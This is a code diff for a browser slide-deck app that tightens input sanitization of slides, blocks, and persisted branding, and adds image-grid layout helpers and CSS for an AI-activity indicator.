   if (clean.value) clean.value = sanitizeString(String(clean.value), 100);
   if (clean.title) clean.title = sanitizeString(clean.title, 500);
+  // Text-ish block fields that also reach the Markdown exporter — strip HTML at
+  // ingress so no field relies on the export encoder alone (defense-in-depth,
+  // complete mediation): a `<img>`/autolink in these must never survive import.
+  if (clean.loopLabel) clean.loopLabel = sanitizeString(clean.loopLabel, 200);
+  if (clean.alt) clean.alt = sanitizeString(clean.alt, 500);
+  if (clean.centerLabel) clean.centerLabel = sanitizeString(clean.centerLabel, 200);
+  if (clean.centerSub) clean.centerSub = sanitizeString(clean.centerSub, 200);
+  if (clean.annotation) clean.annotation = sanitizeString(clean.annotation, 500);
   if (clean.link) clean.link = sanitizeUrl(clean.link);
   // Image block <img src> auto-fetches on render. Vela decks load nothing
   // external, so restrict to inline data:image/* (no network, no data:text/html).
@@ -906,9 +1212,14 @@ function sanitizeBlock(block) {
       );
     }
     if (clean.type === "grid") {
+      // NOTE: pass the recursion depth explicitly — a bare `.map(sanitizeBlock)`
+      // would hand the array INDEX to the depth parameter.
       clean.items = clean.items.slice(0, 6).map((cell) => ({
         ...cell,
-        blocks: Array.isArray(cell?.blocks) ? cell.blocks.map(sanitizeBlock).filter(Boolean) : [],
+        // Cap nested breadth too: without this, a grid cell can carry an
+        // unbounded blocks array (and each may itself be a grid), bypassing the
+        // 30-blocks/slide breadth limit the slide-level arrays enforce.
+        blocks: Array.isArray(cell?.blocks) ? cell.blocks.slice(0, 30).map((b) => sanitizeBlock(b, depth + 1)).filter(Boolean) : [],
       }));
     }
     if (clean.type === "icon-row") {
@@ -918,6 +1229,7 @@ function sanitizeBlock(block) {
         const c = { ...it };
         if (c.text) c.text = sanitizeString(c.text, 500);
         if (c.label) c.label = sanitizeString(c.label, 200);
+        if (c.title) c.title = sanitizeString(c.title, 500);
         if (c.value) c.value = sanitizeString(String(c.value), 100);
         if (c.link) c.link = sanitizeUrl(c.link);
         return c;
@@ -929,6 +1241,7 @@ function sanitizeBlock(block) {
         const c = { ...it };
         if (c.label) c.label = sanitizeString(c.label, 200);
         if (c.title) c.title = sanitizeString(c.title, 500);
+        if (c.sublabel) c.sublabel = sanitizeString(c.sublabel, 200);
         if (c.text) c.text = sanitizeString(c.text, 1000);
         if (c.date) c.date = sanitizeString(c.date, 50);
         if (c.link) c.link = sanitizeUrl(c.link);
@@ -941,6 +1254,7 @@ function sanitizeBlock(block) {
         const c = { ...it };
         if (c.label) c.label = sanitizeString(c.label, 200);
         if (typeof c.value === "number") c.value = Math.max(0, Math.min(c.value, 100));
+        else if (c.value != null) c.value = sanitizeString(String(c.value), 20);
         return c;
       }).filter(Boolean);
     }
@@ -985,32 +1299,18 @@ function sanitizeBlock(block) {
     if (s && Object.keys(s).length) clean.style = s;
     else delete clean.style;
   }
-  if (Array.isArray(clean.items)) {
-    clean.items = clean.items.map(it => {
-      if (it && typeof it === "object" && "style" in it) {
-        const s = sanitizeStyle(it.style);
-        const c = { ...it };
-        if (s && Object.keys(s).length) c.style = s;
-        else delete c.style;
-        return c;
-      }
-      return it;
-    });
-  }
-  // Strip CSS auto-load values from color/background scalars on the block and on
-  // every item object (flow/icon-row/grid cell/etc. — cell.bg, cell.border,
-  // item.color, dotColor …). See scrubColorFields above. (v12.61)
+  // Strip CSS auto-load values from color/background scalars on the block
+  // itself (the allowlisted top-level object). See scrubColorFields above. (v12.61)
   scrubColorFields(clean);
   scrubLayoutFields(clean);
-  if (Array.isArray(clean.items)) {
-    for (const it of clean.items) { scrubColorFields(it); scrubLayoutFields(it); }
-  }
-  // The matrix block renders from a separate `quadrants` array (not `items`),
-  // so its per-quadrant color scalar must be scrubbed too. (Same CSS auto-load
-  // class as items; quadrants was previously never visited.)
-  if (Array.isArray(clean.quadrants)) {
-    for (const q of clean.quadrants) { scrubColorFields(q); scrubLayoutFields(q); }
-  }
+  // Harden deck SUB-OBJECTS recursively (list items, grid cells, matrix
+  // quadrants, comparison sides + their nested points): scrub color/layout/style
+  // values on every nested object and drop the `_`-prefixed private namespace.
+  // Unlike the top-level object these are raw-spread and keep arbitrary keys, so
+  // the scrubbers are their only backstop — apply them at every level, not just
+  // the first. See scrubSubObject above. (v13.24)
+  if (Array.isArray(clean.items)) scrubSubObject(clean.items);
+  if (Array.isArray(clean.quadrants)) scrubSubObject(clean.quadrants);
   return clean;
 }
 
@@ -1078,16 +1378,36 @@ function sanitizeStudyNotes(raw) {
 
 function sanitizeSlide(slide) {
   if (!slide || typeof slide !== "object") return null;
-  const clean = { ...slide };
+  // Allowlist copy (see SAFE_SLIDE_KEYS): unknown and `_`-prefixed keys are
+  // dropped here, so no deck-supplied field can impersonate a renderer-private
+  // flag or ride along into storage/export.
+  const clean = {};
+  for (const k of SAFE_SLIDE_KEYS) {
+    if (Object.prototype.hasOwnProperty.call(slide, k)) clean[k] = slide[k];
+  }
+  // Type + range at ingress for the numeric layout fields (see SLIDE_NUMERIC_BOUNDS).
+  for (const k in SLIDE_NUMERIC_BOUNDS) {
+    if (!(k in clean)) continue;
+    const [min, max, isInt] = SLIDE_NUMERIC_BOUNDS[k];
+    const n = clampDeckNumber(clean[k], min, max, isInt);
+    if (n === undefined) delete clean[k]; else clean[k] = n;
+  }
   // `hidden` (slide excluded from presentation/counts) — strict boolean only.
   if ("hidden" in clean) { if (clean.hidden === true) clean.hidden = true; else delete clean.hidden; }
-  if (Array.isArray(clean.blocks)) clean.blocks = clean.blocks.slice(0, 30).map(sanitizeBlock).filter(Boolean);
-  if (Array.isArray(clean.L)) clean.L = clean.L.slice(0, 30).map(sanitizeBlock).filter(Boolean);
-  if (Array.isArray(clean.R)) clean.R = clean.R.slice(0, 30).map(sanitizeBlock).filter(Boolean);
+  // NOTE: wrap the sanitizeBlock calls — a bare `.map(sanitizeBlock)` would pass
+  // the array INDEX into the recursion-depth parameter.
+  if (Array.isArray(clean.blocks)) clean.blocks = clean.blocks.slice(0, 30).map((b) => sanitizeBlock(b)).filter(Boolean);
+  if (Array.isArray(clean.L)) clean.L = clean.L.slice(0, 30).map((b) => sanitizeBlock(b)).filter(Boolean);
+  if (Array.isArray(clean.R)) clean.R = clean.R.slice(0, 30).map((b) => sanitizeBlock(b)).filter(Boolean);
   if (clean.title) clean.title = sanitizeString(clean.title, 500);
   if (clean.subtitle) clean.subtitle = sanitizeString(clean.subtitle, 500);
   if (clean.quote) clean.quote = sanitizeString(clean.quote, 2000);
   if (clean.author) clean.author = sanitizeString(clean.author, 200);
+  // Speaker/presenter notes are plain-text metadata that the Markdown exporter
+  // emits — HTML-strip them at ingress so no field depends on the export encoder
+  // alone (defense-in-depth, complete mediation).
+  if (clean.speakerNotes) clean.speakerNotes = sanitizeString(String(clean.speakerNotes), 5000);
+  if (clean.notes) clean.notes = sanitizeString(String(clean.notes), 5000);
   if (Array.isArray(clean.bullets)) clean.bullets = clean.bullets.slice(0, 30).map((b) => sanitizeString(String(b), 1000));
   if (Array.isArray(clean.comments)) clean.comments = clean.comments.slice(0, MAX_COMMENTS).map(sanitizeComment).filter(Boolean);
   if (clean.studyNotes) {
@@ -1096,7 +1416,11 @@ function sanitizeSlide(slide) {
   }
   // Slide background/color scalars (bg, bgGradient, color, accent, mutedColor)
   // feed inline CSS directly — scrub CSS auto-load values. See scrubColorFields. (v12.61)
+  // sanitizeBlock also runs scrubLayoutFields on the analogous block-level layout
+  // scalars (padding, gap, …) — apply the same pair here so the two ingress paths
+  // stay consistent instead of one silently omitting a scrubber. (v13.26)
   scrubColorFields(clean);
+  scrubLayoutFields(clean);
   // bgImage is a background *image* (auto-fetches on render). Restrict to inline
   // data:image/* — no network — matching the image block / branding-logo rule.
   if ("bgImage" in clean) {
@@ -1125,6 +1449,65 @@ function sanitizeItem(item) {
     createdAt: typeof item.createdAt === "string" ? item.createdAt.slice(0, 30) : now(),
     ...(item.presentCard ? { presentCard: true } : {}),
   };
+}
+
+// SECURITY (storage-load re-sanitization): the boot path reads the deck back
+// from persisted storage (localStorage / artifact storage) as raw
+// `JSON.parse(...)` and used to dispatch it straight into LOAD, which only
+// spreads the payload — it never re-runs sanitizeSlide. A slide that once
+// reached state unsanitized (e.g. a value written before a sanitizer fix
+// shipped, or via any future ingestion gap) would therefore reload — and keep
+// reloading — with its dangerous value intact: the value is JSON-native, so it
+// round-trips through storage perfectly. This is the persistence leg of the
+// same "trust the ingress sanitizer, nothing else" gap; every OTHER load path
+// (file import, startup-patch merge) already runs validateAndSanitizeDeck.
+//
+// Unlike validateAndSanitizeDeck (built for a fresh deck IMPORT — it discards
+// ids, chat history, selection, branding, etc. and is not safe to use for a
+// normal boot reload), this helper re-sanitizes ONLY the slide content inside
+// an already-loaded lanes tree: ids, comments, order, and every other item/lane
+// field are left exactly as read. It exists purely to re-run the same
+// sanitizeSlide() gate (allowlist copy + scrubCssFields fail-closed delete) that
+// every fresh-ingress path already gets, so a persisted deck can never be more
+// trusted than a freshly-supplied one. (v13.26)
+function resanitizeLoadedLanes(lanes) {
+  if (!Array.isArray(lanes)) return lanes;
+  return lanes.map((lane) => {
+    if (!lane || typeof lane !== "object") return lane;
+    const items = Array.isArray(lane.items) ? lane.items.map((item) => {
+      if (!item || typeof item !== "object") return item;
+      if (!Array.isArray(item.slides)) return item;
+      return { ...item, slides: item.slides.map(sanitizeSlide).filter(Boolean) };
+    }) : lane.items;
+    return { ...lane, items };
+  });
+}
+
+// SECURITY (storage-load re-sanitization, branding leg): resanitizeLoadedLanes
+// above re-scrubs slide/block content read back from storage but deliberately
+// leaves `branding` untouched (it isn't "slide content"). Branding's own color
+// scalars (accentColor, footerBg, footerColor, ...) feed the exact same raw-CSS
+// `background`/`color` sinks as slide/block fields, so a value that predates a
+// scrubber fix (or reached storage through any future ingestion gap) would
+// reload — and keep reloading — with its dangerous value intact, the same
+// persistence gap resanitizeLoadedLanes exists to close for slides. Reuse
+// scrubColorFields — the SAME function the SET_BRANDING reducer already runs on
+// every runtime branding edit — so a persisted branding object can never be
+// more trusted than a freshly-edited one. `logo` is additionally re-clamped to
+// an inline `data:image/*` URI (mirroring validateAndSanitizeDeck's import-time
+// clamp): it is an <img src> fetch sink that scrubColorFields' key patterns
+// don't cover, so it needs its own re-validation on the same reload path. Every
+// other branding field (names, ids, toggles, numeric sizing) is left exactly as
+// read — this only re-runs the two sanitizers that already gate fresh ingress. (v13.27)
+function resanitizeLoadedBranding(branding) {
+  if (!branding || typeof branding !== "object") return branding;
+  const b = { ...branding };
+  scrubColorFields(b);
+  if ("logo" in b) {
+    const clamped = sanitizeImageDataUri(typeof b.logo === "string" ? b.logo : "");
+    if (clamped) b.logo = clamped; else delete b.logo;
+  }
+  return b;
 }
 
 function validateAndSanitizeDeck(raw) {
@@ -1209,13 +1592,30 @@ const imageAspect = (dataUrl) => new Promise((resolve) => {
 // the image below ("stack"); otherwise the slide is promoted to "image-right" so
 // the image sits beside the existing body content. aspect = image width / height.
 const PASTE_TITLE_BLOCKS = new Set(["heading", "text", "subtitle", "badge", "quote"]);
-function pasteImageLayout(slide, aspect) {
+function pasteImageLayout(slide, aspect, n) {
   const layout = slide && slide.layout;
   if (layout && layout !== "stack") return layout; // respect explicit author layout
   const body = ((slide && slide.blocks) || []).filter((b) => b.type !== "image" && b.type !== "spacer" && b.type !== "divider");
   const mostlyTitle = body.length <= 2 && body.every((b) => PASTE_TITLE_BLOCKS.has(b.type));
+  const hasContent = body.length > 0 && !mostlyTitle;
+  // Heavy body text + a grid of images (>=3): don't cram the grid into a half.
+  // Keep the slide stacked so the text reads as a full-width header and the
+  // image run grids full-width below it (the renderer auto-grids the run).
+  if (hasContent && n >= 3) return "stack";
   const wide = aspect >= 1.6;
   return (!mostlyTitle && !wide) ? "image-right" : "stack";
+}
+
+// Columns for a run of `n` images, by region. "full" = image-only slide or a
+// full-width run below text; "half" = the image column beside body content.
+// Count-driven so the arrangement is a pure function of the run length (paste,
+// AI, or import all self-heal, and removal re-grids for free — no stored geometry).
+//   full:  1→1 solo · 2→1x2 · 3→1x3 · 4→2x2 · 5→3+2 (last row centered)
+//   half:  1→1 · >=2→2 (2-up, incomplete last row centered)
+function gridColsFor(n, region) {
+  n = Math.max(1, n | 0);
+  if (region === "half") return n <= 1 ? 1 : 2;
+  return ({ 1: 1, 2: 2, 3: 3, 4: 2, 5: 3 })[n] || 3;
 }
 
 // ━━━ Status & Importance Meta ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1408,9 +1808,27 @@ const getCss = () => `
 @keyframes stg{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
 @keyframes veraScan{0%{left:-60%}100%{left:160%}}
 @keyframes veraPulse{0%,100%{filter:brightness(1) saturate(1)}50%{filter:brightness(1.08) saturate(1.2)}}
+/* Type-register --vera-accent as a real <color>: an @property-registered custom
+   property is subject to CSS's own syntax check at the CSS layer, so even a value
+   that reached this point outside the normal cssColor()-encoded render path (the
+   set-property call itself, part-slides.jsx) falls back to initial-value instead
+   of being usable in var()/color-mix() below — a CSS-native backstop alongside the
+   JS-side encoder. inherits:true is required: the ::before/::after sweeps below
+   consume the value on descendant pseudo-elements, not the declaring node itself. */
+@property --vera-accent{syntax:"<color>";inherits:true;initial-value:#3b82f6}
+/* CR5: unified "Vera is working on this slide" scan. The sweep tint follows the
+   slide accent via --vera-accent (set on the wrapper), falling back to the
+   original Vera blue/violet when unset or where color-mix is unsupported. */
 .vera-thinking{position:relative;overflow:hidden;animation:veraPulse 2s ease-in-out infinite}
-.vera-thinking::before{content:'';position:absolute;top:0;left:-60%;width:40%;height:100%;background:linear-gradient(90deg,transparent,rgba(59,130,246,0.06),rgba(167,139,250,0.12),rgba(59,130,246,0.06),transparent);animation:veraScan 2s ease-in-out infinite;z-index:15;pointer-events:none}
+.vera-thinking::before{content:'';position:absolute;top:0;left:-60%;width:40%;height:100%;background:linear-gradient(90deg,transparent,rgba(59,130,246,0.06),rgba(167,139,250,0.12),rgba(59,130,246,0.06),transparent);background:linear-gradient(90deg,transparent,color-mix(in srgb,var(--vera-accent,#3b82f6) 8%,transparent),color-mix(in srgb,var(--vera-accent,#a78bfa) 16%,transparent),color-mix(in srgb,var(--vera-accent,#3b82f6) 8%,transparent),transparent);animation:veraScan 2s ease-in-out infinite;z-index:15;pointer-events:none}
 .vera-thinking::after{content:'';position:absolute;top:0;left:-60%;width:30%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.04),transparent);animation:veraScan 2s ease-in-out .6s infinite;z-index:15;pointer-events:none}
+/* CR5: reduced-motion — drop the sweep/breathing but keep a calm static accent
+   glow so the "AI is on this slide" signal survives; completion swaps instantly. */
+@media (prefers-reduced-motion: reduce){
+  .vera-thinking{animation:none;box-shadow:inset 0 0 0 2px rgba(59,130,246,0.4);box-shadow:inset 0 0 0 2px color-mix(in srgb,var(--vera-accent,#3b82f6) 40%,transparent)}
+  .vera-thinking::before,.vera-thinking::after{animation:none;opacity:.4}
+  .magic-reveal,.magic-reveal::after{animation:none}
+}
 [class^="stg-"]{max-width:100%;box-sizing:border-box}
 .stg-1{animation:stg .4s ease-out .05s both}.stg-2{animation:stg .4s ease-out .12s both}.stg-3{animation:stg .4s ease-out .19s both}
 .stg-4{animation:stg .4s ease-out .26s both}.stg-5{animation:stg .4s ease-out .33s both}.stg-6{animation:stg .4s ease-out .4s both}.stg-7{animation:stg .4s ease-out .47s both}
@@ -1461,7 +1879,8 @@ function useSwipe(ref, { onLeft, onRight, threshold = 50 } = {}) {
 }
 
 // ━━━ Shared Prompt Constants (deduped from 3 system prompts) ━━━━━━━
-const BLOCK_REFERENCE = `Slide: { blocks: [...], bg?, bgGradient?: "linear-gradient(...)", color?, accent?, align?, verticalAlign?, padding?, gap?, duration?: seconds_integer, layout?: "stack"|"image-right"|"image-left"|"cols", contentFlex?, imageFlex?, splitGap?, L?: [...], R?: [...] }
+const BLOCK_REFERENCE = `Slide: { blocks: [...], bg?, bgGradient?: "linear-gradient(...)", color?, accent?, align?, verticalAlign?, padding?, gap?, duration?: seconds_integer, layout?: "stack"|"image-right"|"image-left"|"cols", contentFlex?, imageFlex?, splitGap?, imageCols?: 1-6, L?: [...], R?: [...] }
+Numeric slide fields are range-checked on load: imageCols is an integer 1-6, gap/splitGap 0-200, contentFlex/imageFlex 0.1-20. imageCols pins the column count for a run of adjacent image blocks (omit for automatic).
 Layout: "stack" (default) = vertical column. "image-right"/"image-left" = splits content blocks and image blocks side-by-side. "cols" = explicit two-column layout using L (left blocks) and R (right blocks) arrays. blocks renders full-width above columns (optional header). contentFlex/imageFlex control column ratio (default 1:1). splitGap controls gap between columns (default 32).
 Inline formatting: All text supports **bold**, *italic*, ***bold+italic*** using markdown syntax (also __bold__ and _italic_). Use in headings, text, bullets, callouts, etc.
 Links: ANY block can have an optional "link" property: {type:"text", text:"Read the paper", link:"https://..."} — renders clickable. For sources/citations, ALWAYS use a descriptive text block or badge with link property instead of putting raw URLs in text. E.g. {type:"badge", text:"📎 Yao et al., ReAct (2022)", icon:"ExternalLink", link:"https://arxiv.org/abs/2210.03629"} or {type:"text", text:"Source: Snorkel AI Blog", size:"sm", link:"https://snorkel.ai/blog/..."}
